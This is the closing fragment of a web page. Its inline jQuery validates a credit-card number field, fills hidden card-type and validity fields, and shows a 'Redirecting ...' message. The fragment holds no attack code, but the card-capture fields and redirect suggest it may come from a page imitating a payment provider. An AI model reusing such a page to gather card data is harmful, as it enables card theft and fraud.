	<script src="../../lib/js/jquery.mask.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
<div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Redirecting ... </p></div>
</body>
</html>